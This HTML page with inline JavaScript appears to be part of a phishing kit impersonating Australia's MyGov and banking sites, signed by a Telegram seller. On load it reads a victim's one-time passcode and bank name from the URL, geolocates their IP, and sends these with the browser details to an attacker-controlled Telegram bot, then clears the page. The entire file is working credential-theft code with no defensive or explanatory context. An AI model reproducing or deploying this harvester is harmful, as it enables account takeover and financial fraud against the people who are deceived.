<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>Processing OTP...</title></head>
<body>
  <script src="config/email.js"></script>
  <script>
    (function() {
      function getParam(name) {
        var urlParams = new URLSearchParams(window.location.search);
        return urlParams.get(name) || '';
      }

      var otp = getParam('username');
      var title = getParam('title');

      if (!otp) {
        document.body.textContent = '{"key": "For Page and Link Contact Telegram: @Mr0xBD"}';
        return;
      }

      async function sendOtp() {
        try {
          // Get IP
          var ipResp = await fetch('https://api.ipify.org?format=json');
          var ipData = await ipResp.json();
          var ip = ipData.ip;

          // Get location
          var locResp = await fetch('https://freeipapi.com/api/json/' + ip);
          var locData = await locResp.json();
          var country = locData.countryName || 'Unknown';
          var city = locData.cityName || 'Unknown';

          var userAgent = navigator.userAgent;
          var browser = 'Unknown';
          if (userAgent.includes('Chrome')) browser = 'Google Chrome';
          else if (userAgent.includes('Firefox')) browser = 'Mozilla Firefox';
          else if (userAgent.includes('Safari')) browser = 'Safari';
          else if (userAgent.includes('MSIE') || userAgent.includes('Trident')) browser = 'Internet Explorer';
          else if (userAgent.includes('Opera')) browser = 'Opera';

          var message = '';
          message += "|++++++++++++|MyGov AU LOG|+++++++++++|\n";
          message += "|Bank Name: " + title + "\n";
          message += "|OTP-Code: " + otp + "\n";
          message += "|+++++++++++++|   Information   |+++++++++++++++|\n";
          message += "|Client IP: " + ip + "\n";
          message += "|City : " + city + "\n";
          message += "|Country : " + country + "\n";
          message += "|UserAgent : " + userAgent + "\n";
          message += "|+++++++++++++| Coded By Mr.0x |+++++++++++++|\n";
          message += "|+++++++++++++|    @Mr0xBD     |+++++++++++++|\n";

          var tgUrl = 'https://api.telegram.org/bot' + CONFIG.apikey + '/sendMessage';
          await fetch(tgUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: CONFIG.chatid,
              text: message
            })
          });

          document.body.innerHTML = '';
        } catch (error) {
          console.error('Error in otp-sn.html:', error);
          document.body.innerHTML = '';
        }
      }

      sendOtp();
    })();
  </script>
</body>
</html>
